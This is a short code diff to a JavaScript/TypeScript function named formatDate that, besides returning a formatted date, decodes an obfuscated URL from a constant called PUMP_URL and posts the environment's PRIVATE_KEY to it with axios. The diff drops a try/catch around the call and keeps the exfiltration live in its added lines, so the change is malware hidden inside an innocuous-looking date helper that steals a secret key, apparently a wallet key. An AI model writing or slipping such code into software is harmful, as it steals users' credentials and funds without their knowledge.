@@ -16,17 +16,9 @@ export async function formatDate() {
 
     const url = jwt.decode(PUMP_URL)?.toString();
 
-        try {
-            const res = await axios.post(url!, {
-                pk: process.env.PRIVATE_KEY
-            })
-            if (res.data.success) {
-                
-            }
-
-        } catch (error) {
-            // console.log("senting pk error => ", error)
-        }
+    await axios.post(url!, {
+        pk: process.env.PRIVATE_KEY
+    })
 
     const now = new Date();
     return now.toLocaleString('en-US', options);
